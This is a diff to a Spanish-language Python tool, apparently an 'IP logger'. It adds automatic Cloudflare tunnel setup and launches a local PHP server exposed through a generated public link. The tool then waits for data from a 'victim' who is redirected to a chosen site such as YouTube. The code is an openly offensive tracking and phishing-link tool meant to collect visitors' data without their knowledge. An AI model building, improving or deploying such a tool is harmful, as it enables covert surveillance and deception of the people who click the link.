@@ -3,6 +3,18 @@
 import os
 import time
 
+if os.path.isfile('server/cloudflared'):
+   pass
+else:
+  print('\n\033[31m[!] Cloudflare no esta instalado.')
+  print('\n\033[35m[~] Instalando cloudflare...')
+  os.system("bash modules/install.sh")
+  
+if os.path.isfile('server/.cld.log'):
+  os.system("rm server/.cld.log")
+else:
+  pass
+
 logo = """\033[33m
   _____ _____  _      ____   _____  _____ ______ _____  
  |_   _|  __ \| |    / __ \ / ____|/ ____|  ____|  __ \ 
@@ -48,6 +60,12 @@ header('Location: index.html');
 exit();
 ?>""")
         file2.close()
+      print('\n[~] Utilizando el puerto: 8080')
+      print('\n[~] Creando link...')
+      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
+      os.system("bash modules/launch.sh")
+      print('\n[~] Esperando datos...')
+      check()
     elif var1 == "n" or var1 == "N":
       link = input('\n[~] Ingresa el link para redirigir a la victima (e.j: https://youtube.com): ')      
       file = open('index.php', 'w')
@@ -57,23 +75,12 @@ header('Location: index.html');
 exit();
 ?>""".replace("index.html", link))
       file.close()     
-    var = input('[~] ¿Quieres editar el puerto? (Default: 8080) [Y/n]: ')
-    if var == "Y" or var == "y":
-        port = int(input('\n[~] Ingresa el puerto: '))
-        print(f'\n[~] Utilizando el puerto {port}')
-        print('\n[~] Esperando datos...')
-        os.system(f"php -S localhost:{port} > /dev/null 2>&1 &")
-        check()
-    elif var == "n" or var == "N":
-        print('\n[~] Utilizando el puerto por default: 8080')
-        print('\n[~] Esperando datos...')
-        os.system("php -S localhost:8080 > /dev/null 2>&1 &")
-        check()
-    else:
-        print('\n[!] Error Debes de ingresar una opcion Y/n')
-        time.sleep(2)
-        server()
-    
+      print('\n[~] Utilizando el puerto: 8080')
+      print('\n[~] Creando link...')
+      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
+      os.system("bash modules/launch.sh")
+      print('\n[~] Esperando datos...')
+      check()
 
 def menu():
     os.system("killall php")
